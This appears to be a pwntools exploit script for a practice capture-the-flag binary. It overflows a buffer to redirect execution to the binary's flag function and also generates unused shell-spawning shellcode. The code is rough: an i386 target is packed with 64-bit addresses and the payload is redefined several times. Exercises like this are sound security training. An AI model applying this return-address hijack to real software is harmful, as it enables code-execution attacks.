#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
context.terminal = ['tmux', 'splitw', '-h'] #GDB splits
exe = './vuln.5'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        pass
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *vuln
break *flag
break *flag+100
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

#payload = cyclic(500)
elf = ELF(exe)
ret = elf.sym.flag
#print(hex(ret))
#ret = 0x41414141

shellcode = asm(shellcraft.sh())
payload = fit({188: ret, 196:0xdeadbeef, 200:0xc0ded00d}, length=300)
#payload = fit({76: '\x00\x00\x00\x00', 72: ret})
payload = fit({72: p64(ret)})
#payload = cyclic(500)

io = start()
io.recv()
io.sendline(payload)

with open('payload', 'wb') as f:
    f.write(payload)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

